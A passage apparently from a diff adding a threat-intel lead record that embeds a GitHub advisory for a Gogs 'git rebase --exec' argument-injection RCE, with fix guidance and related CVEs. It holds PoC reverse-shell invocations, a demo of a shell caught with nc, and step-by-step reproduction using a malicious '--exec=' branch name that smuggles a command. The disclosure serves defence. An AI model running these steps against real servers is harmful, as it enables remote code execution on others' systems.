attacker -p Password123 -l <LHOST> -x <LPORT> # Reverse shell (Windows) python3 gogs-rebase-rce.py -t http://gogs:3000 -u attacker -p Password123 -l <LHOST> -x <LPORT> --os windows # Custom command python3 gogs-rebase-rce.py -t http://gogs:3000 -u attacker -p Password123 -c 'id > /tmp/pwned' # Version fingerprint only (no exploit) python3 gogs-rebase-rce.py -t http://gogs:3000 -u attacker -p Password123 --check ``` #### Demo Run the PoC with a reverse shell payload: ```bash python3 gogs-rebase-rce.py -t http://localhost:3080 -u attacker -p Password123 -l 172.17.0.1 -x 1337 [*] Fingerprinting target... [+] Gogs 0.14.2 detected [*] Authenticating as \"attacker\" [+] Authenticated [*] Creating repository [+] Repository xxxx-yyyy created [*] Enabling rebase merge [+] Rebase merge enabled [*] Pushing branches via git [+] Branches pushed [*] Creating pull request [+] PR #1 created [*] Triggering rebase merge - RCE fires now! [+] Rebase merge triggered ``` Checking the listener: ```bash $ nc -nlvp 1337 Listening on 0.0.0.0 1337 Connection received on 172.17.0.2 43240 $ whoami git ``` ### Manual Browser Reproduction This can be reproduced entirely through the Gogs web UI: **Prerequisites**: A running Gogs instance (e.g., `http://localhost:3080`) with a registered user account. **Step 1: Create a repository and push branches** ```bash # Create repo via Gogs API curl -s -u attacker:Password123 -X POST http://localhost:3080/api/v1/user/repos \\ -H 'Content-Type: application/json' -d '{\"name\":\"demo\"}' # Set up local repo with divergent branches mkdir /tmp/demo && cd /tmp/demo && git init git config user.email \"attacker@test.com\" && git config user.name \"attacker\" echo \"# Demo\" > README.md && git add . && git commit -m \"Initial commit\" git checkout -b feature echo \"feature\" > feature.txt && git add . && git commit -m \"Add feature\" git checkout master echo \"update\" >> README.md && git add . && git commit -m \"Update master\" # Create the malicious branch (same commit as master) git update-ref 'refs/heads/--exec=touch${IFS}/tmp/BROWSER_RCE_PROOF' HEAD # Push all branches git remote add origin http://attacker:Password123@localhost:3080/attacker/demo.git git push origin master feature 'refs/heads/--exec=touch${IFS}/tmp/BROWSER_RCE_PROOF:refs/heads/--exec=touch${IFS}/tmp/BROWSER_RCE_PROOF' ``` **Step 2: Enable rebase in repo settings** 1. Navigate to `http://localhost:3080/attacker/demo/settings` 2. Click **Advanced Settings** 3. Check **Enable Pull Requests**, then check **Allow rebase** 4. Click **Save** (Or update the database directly: `UPDATE repository SET enable_pulls=1, pulls_allow_rebase=1 WHERE lower_name='demo';`) **Step 3: Create the Pull Request** Navigate to the compare URL (base = malicious branch, head = feature): ``` http://localhost:3080/attacker/demo/compare/%2D%2Dexec%3Dtouch%24%7BIFS%7D%2Ftmp%2FBROWSER_RCE_PROOF...feature ``` Enter a title (e.g., \"RCE PoC\") and click **New Pull Request**. **Step 4: Wait for testPatch (~5 seconds)** The background `TestPullRequests` goroutine must set the PR to Mergeable. Wait a few seconds, then refresh the PR page. The merge button should appear. **Step 5: Trigger the merge** 1. On the PR page (`/attacker/demo/pulls/1`), select **Rebase before merging** 2. Click **Merge Pull Request** 3. The server returns HTTP 500 (expected - `git checkout` of the malicious branch name fails after rebase) **Step 6: Verify RCE** ```bash $ ls -la /tmp/BROWSER_RCE_PROOF -rw-rw-r-- 1 cryptocat cryptocat 0 Mar 16 18:02 /tmp/BROWSER_RCE_PROOF ``` The file was created by the Gogs server process during `git rebase --exec` ## Recommended Fix ### Primary fix: Add `--` separator ```go // internal/database/pull.go line 282 \"git\", \"rebase\", \"--quiet\", \"--\", pr.BaseBranch, remoteHeadBranch ``` ### Defense-in-depth: Validate branch names Reject base branch names starting with `-` at the PR creation endpoint: ```go // internal/route/repo/pull.go, after line 447 if strings.HasPrefix(baseRef, \"-\") { c.NotFound() return nil, nil, nil, nil, \"\", \"\" } ``` ### Additional hardening Apply `--` separators to all other `process.ExecDir` calls in `Merge()` that use `pr.BaseBranch`: - Line 233: `git clone -b pr.BaseBranch` (not directly exploitable but should be hardened) - Line 297: `git checkout pr.BaseBranch` (currently fails, but should use `-- pr.BaseBranch`) - Line 315: `git push <repo> pr.BaseBranch` (should use `--` separator) ## Relationship to Prior Argument Injection Fixes This vulnerability is an **incomplete fix bypass** of the Category A argument injection invariant that Gogs has been patching across multiple advisories: | Advisory | CVE | Description | Fix Applied | | ------------------------------------------------------------------------------------------- | ----------------------------------------------------------------- | -------------------------------------------- | -------------------------------------------------------------- | | [GHSA-m27m-h5gj-wwmg](https://github.com/gogs/gogs/security/advisories/GHSA-m27m-h5gj-wwmg) | [CVE-2024-39933](https://nvd.nist.gov/vuln/detail/CVE-2024-39933) | Argument injection when tagging new releases | Added `--` separator to `git tag` | | [GHSA-9pp6-wq8c-3w2c](https://github.com/gogs/gogs/security/advisories/GHSA-9pp6-wq8c-3w2c) | [CVE-2024-39932](https://nvd.nist.gov/vuln/detail/CVE-2024-39932) | Argument injection during changes preview | Added `--end-of-options` to `git diff` | | [GHSA-v9vm-r24h-6rqm](https://github.com/gogs/gogs/security/advisories/GHSA-v9vm-r24h-6rqm) | [CVE-2026-26194](https://nvd.nist.gov/vuln/detail/CVE-2026-26194) | Release tag option injection in deletion | Migrated to safe git-module API | | [GHSA-vm62-9jw3-c8w3](https://github.com/gogs/gogs/security/advisories/GHSA-vm62-9jw3-c8w3) | [CVE-2024-39930](https://nvd.nist.gov/vuln/detail/CVE-2024-39930) | Argument injection in built-in SSH server | Added `--` separator to `git upload-pack` / `git receive-pack` | The [`git-module` library](https://github.com/gogs/git-module) (`v1.8.7`) was hardened with `--end-of-options` in `Clone()`, `Push()`, `Fetch()`, and 28 other call sites. However, the `Merge()` function in `internal/database/pull.go` **bypasses all of these protections** because it uses raw `process.ExecDir` (which wraps `exec.Command` directly) instead of the safe git-module API. The [`git rebase` call](https://github.com/gogs/gogs/blob/v0.14.2/internal/database/pull.go#L282) was never migrated. Notably, `git-module.Checkout()` is also missing `--end-of-options` — a separate gap that incidentally causes the `testPatch` race condition this exploit leverages (see \"Why the PR Becomes Mergeable\" above). ## Affected Platforms The vulnerability has been confirmed on: - **Linux**: Docker (official image) and binary installation on Ubuntu 24.04 - **Windows**: Binary installation with Git for Windows (MSYS2) On Windows, the base64 inline payload approach fails because NTFS forbids the `|` character in filenames (git stores refs as files). The exploit uses file-based payload delivery instead: the payload is committed as a script file, and the branch name becomes `--exec=sh${IFS}<filename>`. An `sh` wrapper invokes `cmd.exe //c <payload>.bat` to avoid MSYS2 shell metacharacter mangling. The attached PoC handles this automatically. ## Test Environment - **OS**: Ubuntu Linux 24.04, Windows (Git for Windows) - **Gogs version**: 0.14.2 (also confirmed on 0.15.0+dev, commit `b53d3162`) - **Go version**: go1.26.1 - **Database**: SQLite - **Deployment**: Docker (official image), binary, and built from source ## Credit Jonah Burgess (CryptoCat) - Senior Security Researcher @Rapid7",
+      "sources": [
+        "github-advisory"
+      ],
+      "sourceRefs": [
+        "https://github.com/advisories/GHSA-qf6p-p7ww-cwr9"
+      ],
+      "mergedLeadRefs": [
+        "github-advisory:GHSA-qf6p-p7ww-cwr9"
+      ],
+      "firstSeenAt": "2026-06-23T17:02:40.000Z",
+      "lastMaterialActivityAt": "2026-06-23T17:02:42.000Z",
+      "activityBasis": [
+        "advisory_updated"
+      ],
+      "entityMatch": "new",
+      "matchedEntityHints": {
+        "actors": [],
+        "campaigns": [],
+        "packages": [],
+        "malwareFamilies": []
+      },
+      "classification": {
+        "leadClass": "current",
+        "leadClassReason": "material activity within 180 days",
+        "workIntent": "create_article",
+        "routingPriority": "p2",
+        "effectiveActiveStatus": "none",
+        "activeStatus": "none",
+        "activeStatusExpiresAt": null,
+        "needsReverify": false,
+        "kevStatusDerived": null,
+        "kevStatusIsAuthoredTruth": false,
+        "manualOverrideValid": false,
+        "manualOverrideErrors": []
+      },
+      "rank": 46,
+      "rankReasons": [
+        "current lead",
+        "advisory database signal",
+        "supply-chain term match"
+      ],
+      "queueAction": "candidate_review",
+      "draftingAllowed": false,
+      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
+    }
+  ]
+}
